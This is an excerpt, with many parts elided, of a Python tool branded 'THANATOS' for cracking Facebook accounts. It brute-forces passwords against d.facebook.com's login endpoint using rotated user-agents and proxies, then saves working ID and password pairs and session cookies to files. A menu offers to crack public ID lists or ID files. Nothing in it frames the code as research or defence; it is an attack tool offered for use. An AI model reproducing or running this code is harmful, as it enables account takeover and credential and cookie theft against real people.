	...
	try:
		...
		with requests.Session() as r:
			try:
				...
				'user-agent': 'Mozilla/5.0 (Linux; Android 4.4.2; Nexus 4 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Mobile Safari/537.3',
...
def menu(my_name,my_id):
	...
	print('\x1b[1;91m[ 1 ] CRACK PUBLIC💀')
	print('')
	print('\x1b[1;91m[ 2 ] CRACK FILE🌺')
	print('')
	print('\x1b[1;91m[ 0 ] SRENAWAY COOKE ')
	print('')
...
def passwrd():
	...
	print('')
	print(f'{h}[THANATOS]{x} {h}OK/%s {x}'%(okc))
	print(f'{k}[THANATOS]{x} {k}CP/%s {x}'%(cpc))
	print(f'{m}{x}\n')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\rTHANATOS {P}[{k}\033[1;31m{loop}\033[1;31m{P}/{h}{len(id)}{P}] - {P}{H}OK - {ok}{P} - {P}\033[1;31mCP - 0{x} - {bo}{'{:.0%}'.format(loop/float(len(id)))}{P}  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			po = ses.post('https://d.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False,proxies=proxs)
				...
				#print(f'\r{M}LUNA🙂-CP  {m}{idf} | {m}{pw}')     
...
'accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})
			...
			#elif "checkpoint" in po.cookies.get_dict().keys():
			#	print(f'\r{M}THAATOS-CP  {m}{idf} | {m}{pw}')
				#open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				#akun.append(idf+'|'+pw)
			#	cp+=1
			#	break
			if "c_user" in ses.cookies.get_dict().keys():
				...
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{h}[ THANATOS-OK ]  {idf} | {pw}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
				cek_apk(session,coki)
				break
...
def cracktouch(idf,pwv):
	...
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	sys.stdout.write('\rTHNS¬¬ OK:%s ¬ CP:%s  %s%s%s '%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					print('\n')
					statuscp = f'[YAA] ID       : {idf} [THNS] PASSWORD : {pw}'
				...
				if 'no' in taplikasi:
					...
					print('\n')
					statusok = f'[thns ok] ID       : {idf}\n[thns ok] PASSWORD : {pw}\n[thns ok] COOKIES  : {kuki}'
					...
					print('\n')
					statusok = f'[bold green][THNS ok] ID       : {idf}\n[THNS ok] PASSWORD : {pw}\n[thns ok] COOKIES  : {kuki}[/bold green]\n{infoakun}'
					statusok1 = nel(statusok, style='green')
...
def crackmbasic(idf,pwv):
	...
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	sys.stdout.write('\r%s THNS¬ %s/%s â˜¬ OK:%s â˜¬ CP:%s â˜¬ %s%s%s â˜¬'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
